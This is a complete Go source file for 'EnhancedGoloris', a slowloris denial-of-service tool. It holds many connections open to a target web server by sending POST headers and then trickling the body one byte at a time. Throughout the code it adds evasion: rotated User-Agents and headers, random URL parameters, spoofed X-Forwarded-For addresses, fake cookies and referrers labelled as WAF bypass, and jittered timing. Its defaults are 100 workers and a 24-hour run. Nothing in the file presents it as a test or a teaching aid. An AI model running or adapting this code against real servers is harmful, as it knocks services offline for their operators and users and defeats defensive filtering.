// EnhancedGoloris - Advanced slowloris attack implementation
// Designed for maximum connection exhaustion with minimal resource usage

package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	// Attack configuration
	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes")
	dialWorkersCount = flag.Int("dialWorkersCount", 100, "The number of workers simultaneously busy with opening new TCP connections")
	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU()*2, "The maximum number of CPUs to use")
	rampUpInterval   = flag.Duration("rampUpInterval", 10*time.Millisecond, "Interval between new connections")
	sleepInterval    = flag.Duration("sleepInterval", 15*time.Second, "Sleep interval between subsequent packets sending")
	testDuration     = flag.Duration("testDuration", 24*time.Hour, "Attack duration")
	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Target URL")
	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
	connectionLimit  = flag.Int("connectionLimit", 0, "Maximum number of connections (0 = unlimited)")
	verbose          = flag.Bool("verbose", false, "Verbose output")
	rotateUserAgent  = flag.Bool("rotateUserAgent", true, "Rotate User-Agent headers")
	rotateHeaders    = flag.Bool("rotateHeaders", true, "Rotate request headers")
	addRandomParams  = flag.Bool("addRandomParams", true, "Add random URL parameters")
	connectionRetry  = flag.Int("connectionRetry", 3, "Number of connection retry attempts")
	keepAliveTimeout = flag.Duration("keepAliveTimeout", 30*time.Second, "TCP keep-alive timeout")
	connectionJitter = flag.Duration("connectionJitter", 500*time.Millisecond, "Random jitter for connection timing")
	bypassFingerprint = flag.Bool("bypassFingerprint", true, "Use techniques to bypass WAF fingerprinting")
	statusInterval   = flag.Duration("statusInterval", 5*time.Second, "Status update interval")
)

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")

	tlsConfig = &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	// Connection tracking
	activeConnections int32
	totalConnections  int32
	successfulConns   int32
	failedConns       int32

	// User-Agent rotation
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112",
	}

	// Header rotation
	headerSets = []map[string]string{
		{
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate, br",
			"Connection": "keep-alive",
			"Upgrade-Insecure-Requests": "1",
			"Cache-Control": "max-age=0",
		},
		{
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.8,fr;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "keep-alive",
			"DNT": "1",
		},
		{
			"Accept": "application/json, text/javascript, */*; q=0.01",
			"Accept-Language": "en-US,en;q=0.9",
			"Accept-Encoding": "gzip, deflate, br",
			"Connection": "keep-alive",
			"X-Requested-With": "XMLHttpRequest",
		},
	}

	// Random parameter names
	paramNames = []string{
		"id", "page", "ref", "src", "action", "token", "type", "view", "lang", "theme",
		"format", "version", "time", "date", "auth", "session", "redirect", "debug", "mode",
	}

	// Mutex for synchronized logging
	logMutex sync.Mutex
)

func main() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())

	// Print banner
	fmt.Println("\n╔═══════════════════════════════════════════════════════════╗")
	fmt.Println("║ EnhancedGoloris - Advanced Connection Exhaustion Tool ║")
	fmt.Println("╚═══════════════════════════════════════════════════════════╝\n")

	// Print configuration
	fmt.Printf("Target: %s\n", *victimUrl)
	fmt.Printf("Workers: %d, Duration: %s\n", *dialWorkersCount, *testDuration)
	fmt.Printf("Connection interval: %s, Packet interval: %s\n", *rampUpInterval, *sleepInterval)
	fmt.Printf("CPU cores: %d\n\n", *goMaxProcs)

	// Set maximum CPU usage
	runtime.GOMAXPROCS(*goMaxProcs)

	// Parse target URL
	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", *victimUrl, err)
	}

	// Prepare host and port
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}

	// Set host header
	host := victimUri.Host
	if len(*hostHeader) > 0 {
		host = *hostHeader
	}

	// Start status reporter
	go statusReporter()

	// Start connection workers
	var wg sync.WaitGroup
	for i := 0; i < *dialWorkersCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			dialWorker(id, victimHostPort, victimUri, host)
		}(i)
		
		// Add jitter to connection timing
		jitter := time.Duration(rand.Int63n(int64(*connectionJitter)))
		time.Sleep(*rampUpInterval + jitter)
	}

	// Set up termination timer
	terminate := time.After(*testDuration)
	<-terminate

	// Print final statistics
	logSafe("Attack completed. Final statistics:")
	logSafe(fmt.Sprintf("Total connections attempted: %d", atomic.LoadInt32(&totalConnections)))
	logSafe(fmt.Sprintf("Successful connections: %d", atomic.LoadInt32(&successfulConns)))
	logSafe(fmt.Sprintf("Failed connections: %d", atomic.LoadInt32(&failedConns)))
	logSafe(fmt.Sprintf("Active connections at exit: %d", atomic.LoadInt32(&activeConnections)))
}

func dialWorker(id int, victimHostPort string, victimUri *url.URL, host string) {
	isTls := (victimUri.Scheme == "https")

	for {
		// Check if we've reached the connection limit
		if *connectionLimit > 0 && int(atomic.LoadInt32(&activeConnections)) >= *connectionLimit {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Create a new connection
		conn := dialVictim(victimHostPort, isTls)
		if conn != nil {
			// Generate request with evasion techniques
			requestHeader := generateRequest(victimUri, host)
			
			// Launch the attack on this connection
			go doLoris(conn, requestHeader)
		}

		// Add jitter to connection timing
		jitter := time.Duration(rand.Int63n(int64(*connectionJitter)))
		time.Sleep(*rampUpInterval + jitter)
	}
}

func generateRequest(victimUri *url.URL, host string) []byte {
	// Create a copy of the URI that we can modify
	targetUri := *victimUri
	
	// Add random URL parameters if enabled
	if *addRandomParams {
		q := targetUri.Query()
		
		// Add 1-3 random parameters
		paramCount := rand.Intn(3) + 1
		for i := 0; i < paramCount; i++ {
			paramName := paramNames[rand.Intn(len(paramNames))]
			paramValue := randomString(5 + rand.Intn(10))
			q.Add(paramName, paramValue)
		}
		
		targetUri.RawQuery = q.Encode()
	}

	// Select headers based on configuration
	headers := "Host: " + host + "\r\n"
	headers += "Content-Type: application/x-www-form-urlencoded\r\n"
	headers += fmt.Sprintf("Content-Length: %d\r\n", *contentLength)
	
	// Add User-Agent if rotation is enabled
	if *rotateUserAgent {
		userAgent := userAgents[rand.Intn(len(userAgents))]
		headers += "User-Agent: " + userAgent + "\r\n"
	}
	
	// Add additional headers if rotation is enabled
	if *rotateHeaders {
		headerSet := headerSets[rand.Intn(len(headerSets))]
		for key, value := range headerSet {
			headers += key + ": " + value + "\r\n"
		}
	}
	
	// Add WAF bypass techniques
	if *bypassFingerprint {
		// Add random cookies
		cookieValue := "session=" + randomString(20) + "; "
		cookieValue += "visitor=" + randomString(15) + "; "
		cookieValue += "id=" + randomString(10)
		headers += "Cookie: " + cookieValue + "\r\n"
		
		// Add random client IP (X-Forwarded-For spoofing)
		if rand.Intn(2) == 1 {
			headers += "X-Forwarded-For: " + randomIP() + "\r\n"
		}
		
		// Add random referrer
		if rand.Intn(2) == 1 {
			referrers := []string{
				"https://www.google.com/search?q=" + randomString(5),
				"https://www.bing.com/search?q=" + randomString(5),
				"https://t.co/" + randomString(7),
				"https://www.facebook.com/",
				"https://www.linkedin.com/",
			}
			headers += "Referer: " + referrers[rand.Intn(len(referrers))] + "\r\n"
		}
	}
	
	// Complete the headers
	headers += "\r\n"
	
	// Construct the full request
	request := fmt.Sprintf("POST %s HTTP/1.1\r\n%s", targetUri.RequestURI(), headers)
	return []byte(request)
}

func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
	// Track connection attempts
	atomic.AddInt32(&totalConnections, 1)
	
	// Try multiple times if retry is enabled
	for attempt := 0; attempt < *connectionRetry; attempt++ {
		// Establish TCP connection
		conn, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
		if err != nil {
			if *verbose {
				logSafe(fmt.Sprintf("Connection attempt %d failed: %s", attempt+1, err))
			}
			time.Sleep(time.Duration(attempt*100) * time.Millisecond)
			continue
		}
		
		// Configure TCP connection
		tcpConn := conn.(*net.TCPConn)
		
		// Set small buffer sizes to minimize resource usage
		if err = tcpConn.SetReadBuffer(128); err != nil {
			logSafe(fmt.Sprintf("Cannot shrink TCP read buffer: %s", err))
			conn.Close()
			continue
		}
		
		if err = tcpConn.SetWriteBuffer(128); err != nil {
			logSafe(fmt.Sprintf("Cannot shrink TCP write buffer: %s", err))
			conn.Close()
			continue
		}
		
		// Disable lingering to immediately release resources on close
		if err = tcpConn.SetLinger(0); err != nil {
			logSafe(fmt.Sprintf("Cannot disable TCP lingering: %s", err))
			conn.Close()
			continue
		}
		
		// Enable keep-alive to maintain connection
		if err = tcpConn.SetKeepAlive(true); err != nil {
			logSafe(fmt.Sprintf("Cannot enable TCP keep-alive: %s", err))
			conn.Close()
			continue
		}
		
		if err = tcpConn.SetKeepAlivePeriod(*keepAliveTimeout); err != nil {
			logSafe(fmt.Sprintf("Cannot set TCP keep-alive period: %s", err))
			conn.Close()
			continue
		}
		
		// For non-TLS connections, we're done
		if !isTls {
			atomic.AddInt32(&successfulConns, 1)
			return tcpConn
		}
		
		// For TLS connections, establish TLS handshake
		tlsConn := tls.Client(conn, tlsConfig)
		tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
		
		if err = tlsConn.Handshake(); err != nil {
			conn.Close()
			if *verbose {
				logSafe(fmt.Sprintf("TLS handshake failed: %s", err))
			}
			time.Sleep(time.Duration(attempt*100) * time.Millisecond)
			continue
		}
		
		// Reset deadline after successful handshake
		tlsConn.SetDeadline(time.Time{})
		atomic.AddInt32(&successfulConns, 1)
		return tlsConn
	}
	
	// All attempts failed
	atomic.AddInt32(&failedConns, 1)
	return nil
}

func doLoris(conn io.ReadWriteCloser, requestHeader []byte) {
	defer conn.Close()
	
	// Track active connections
	atomic.AddInt32(&activeConnections, 1)
	defer atomic.AddInt32(&activeConnections, -1)
	
	// Send the initial request headers
	if _, err := conn.Write(requestHeader); err != nil {
		if *verbose {
			logSafe(fmt.Sprintf("Failed to write request header: %s", err))
		}
		return
	}
	
	// Start a goroutine to read any server responses
	readerStopCh := make(chan struct{}, 1)
	go nullReader(conn, readerStopCh)
	
	// Send the body content extremely slowly
	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			// Connection was closed by the server
			return
		case <-time.After(*sleepInterval + time.Duration(rand.Intn(1000))*time.Millisecond):
			// Add jitter to packet timing
		}
		
		// Send a single byte
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			if *verbose {
				logSafe(fmt.Sprintf("Error when writing byte %d of %d: %s", i, *contentLength, err))
			}
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- struct{}) {
	defer func() { ch <- struct{}{} }()
	
	// Read any response from the server
	buf := make([]byte, 4096)
	for {
		_, err := conn.Read(buf)
		if err != nil {
			// Connection closed or error
			break
		}
	}
}

func statusReporter() {
	ticker := time.NewTicker(*statusInterval)
	defer ticker.Stop()
	
	startTime := time.Now()
	
	for range ticker.C {
		active := atomic.LoadInt32(&activeConnections)
		total := atomic.LoadInt32(&totalConnections)
		success := atomic.LoadInt32(&successfulConns)
		failed := atomic.LoadInt32(&failedConns)
		
		elapsed := time.Since(startTime)
		hours := int(elapsed.Hours())
		minutes := int(elapsed.Minutes()) % 60
		seconds := int(elapsed.Seconds()) % 60
		
		logSafe(fmt.Sprintf("[%02d:%02d:%02d] Active: %d | Total: %d | Success: %d | Failed: %d", 
			hours, minutes, seconds, active, total, success, failed))
	}
}

// Helper functions
func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 
		rand.Intn(223)+1,  // Avoid 0 and 224-255 (reserved ranges)
		rand.Intn(256), 
		rand.Intn(256), 
		rand.Intn(254)+1) // Avoid 0 and 255 (reserved)
}

func logSafe(message string) {
	logMutex.Lock()
	defer logMutex.Unlock()
	log.Println(message)
}
